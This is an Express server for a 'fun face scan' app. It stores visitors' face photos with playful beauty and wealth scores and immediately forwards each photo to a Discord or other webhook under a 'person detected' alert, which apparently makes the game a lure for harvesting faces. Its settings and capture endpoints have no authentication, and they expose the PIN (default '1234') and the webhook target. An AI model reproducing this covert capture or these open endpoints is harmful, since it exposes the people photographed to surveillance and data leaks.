import express from 'express';
import { createServer as createViteServer } from 'vite';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const port = 3000;

app.use(express.json({ limit: '60mb' }));
app.use(express.urlencoded({ extended: true, limit: '60mb' }));

const DATA_DIR = path.join(__dirname, 'data');
const CAPTURES_FILE = path.join(DATA_DIR, 'captures.json');
const SETTINGS_FILE = path.join(DATA_DIR, 'settings.json');

if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}

interface CaptureItem {
  id: string;
  timestamp: number;
  dateString: string;
  photoDataUrl: string;
  faceCropDataUrl?: string;
  videoDataUrl?: string;
  hasVideo?: boolean;
  funAnalysis: {
    title: string;
    beautyScore: number;
    richScore: number;
    mood: string;
    fortuneQuote: string;
    tag: string;
  };
  device?: string;
  isFavorite?: boolean;
}

function loadCaptures(): CaptureItem[] {
  try {
    if (fs.existsSync(CAPTURES_FILE)) {
      const data = fs.readFileSync(CAPTURES_FILE, 'utf-8');
      return JSON.parse(data);
    }
  } catch (err) {
    console.error('Error loading captures:', err);
  }
  return [];
}

function saveCaptures(captures: CaptureItem[]) {
  try {
    fs.writeFileSync(CAPTURES_FILE, JSON.stringify(captures, null, 2), 'utf-8');
  } catch (err) {
    console.error('Error saving captures:', err);
  }
}

function loadSettings() {
  try {
    if (fs.existsSync(SETTINGS_FILE)) {
      return JSON.parse(fs.readFileSync(SETTINGS_FILE, 'utf-8'));
    }
  } catch (err) {
    console.error('Error loading settings:', err);
  }
  return { pin: '1234', webhookUrl: '', autoCaptureDelay: 1200 };
}

function saveSettings(settings: any) {
  try {
    fs.writeFileSync(SETTINGS_FILE, JSON.stringify(settings, null, 2), 'utf-8');
  } catch (err) {
    console.error('Error saving settings:', err);
  }
}

let capturesCache: CaptureItem[] = loadCaptures();
let settingsCache = loadSettings();

app.get('/api/captures', (req, res) => {
  res.json({ success: true, captures: capturesCache });
});

app.post('/api/captures', async (req, res) => {
  try {
    const newCapture: CaptureItem = req.body;
    if (!newCapture || !newCapture.id || !newCapture.photoDataUrl) {
      return res.status(400).json({ success: false, error: 'Dữ liệu không hợp lệ' });
    }

    capturesCache.unshift(newCapture);
    if (capturesCache.length > 200) {
      capturesCache = capturesCache.slice(0, 200);
    }
    saveCaptures(capturesCache);

    // Send notification and photo to Discord Webhook immediately if configured
    if (settingsCache.webhookUrl) {
      try {
        const textContent = `🚨 **PHÁT HIỆN NGƯỜI VÀO QUÉT MẶT!**\n` +
                          `⏰ **Thời gian:** ${newCapture.dateString}\n` +
                          `📱 **Thiết bị:** ${newCapture.device || 'Trình duyệt web'}\n` +
                          `✨ **Đánh giá AI:** ${newCapture.funAnalysis?.title} (${newCapture.funAnalysis?.beautyScore}% điểm)`;

        // If webhookUrl is Discord, we can post JSON with content or multipart form data for image attachment
        const webhookUrl = settingsCache.webhookUrl;
        
        // Convert base64 dataUrl to buffer for multipart upload if Discord
        const base64Data = newCapture.photoDataUrl.replace(/^data:image\/\w+;base64,/, '');
        const buffer = Buffer.from(base64Data, 'base64');

        if (webhookUrl.includes('discord.com')) {
          const boundary = '----WebKitFormBoundary' + Math.random().toString(36).substring(2);
          let bodyData = Buffer.concat([
            Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="payload_json"\r\nContent-Type: application/json\r\n\r\n${JSON.stringify({ content: textContent })}\r\n`),
            Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="face_${newCapture.id}.jpg"\r\nContent-Type: image/jpeg\r\n\r\n`),
            buffer,
            Buffer.from(`\r\n--${boundary}--\r\n`)
          ]);

          fetch(webhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': `multipart/form-data; boundary=${boundary}`,
            },
            body: bodyData,
          }).catch(() => {});
        } else {
          // Standard JSON Webhook (Telegram, Slack, etc.)
          fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              content: textContent,
              image_data: newCapture.photoDataUrl,
            }),
          }).catch(() => {});
        }
      } catch (e) {
        console.error('Webhook dispatch error:', e);
      }
    }

    res.json({ success: true, capture: newCapture, total: capturesCache.length });
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

app.delete('/api/captures/:id', (req, res) => {
  const { id } = req.params;
  capturesCache = capturesCache.filter((c) => c.id !== id);
  saveCaptures(capturesCache);
  res.json({ success: true, total: capturesCache.length });
});

app.delete('/api/captures', (req, res) => {
  capturesCache = [];
  saveCaptures(capturesCache);
  res.json({ success: true, total: 0 });
});

app.patch('/api/captures/:id/favorite', (req, res) => {
  const { id } = req.params;
  const item = capturesCache.find((c) => c.id === id);
  if (item) {
    item.isFavorite = !item.isFavorite;
    saveCaptures(capturesCache);
    return res.json({ success: true, item });
  }
  res.status(404).json({ success: false, error: 'Không tìm thấy mục' });
});

app.get('/api/settings', (req, res) => {
  res.json({ success: true, settings: settingsCache });
});

app.post('/api/settings', (req, res) => {
  settingsCache = { ...settingsCache, ...req.body };
  saveSettings(settingsCache);
  res.json({ success: true, settings: settingsCache });
});

async function startServer() {
  const isProd = process.env.NODE_ENV === 'production';
  if (!isProd) {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    app.use(express.static(path.join(__dirname, 'dist')));
    app.get('*', (req, res) => {
      res.sendFile(path.join(__dirname, 'dist', 'index.html'));
    });
  }

  app.listen(port, '0.0.0.0', () => {
    console.log(`Server running on http://0.0.0.0:${port}`);
  });
}

startServer();
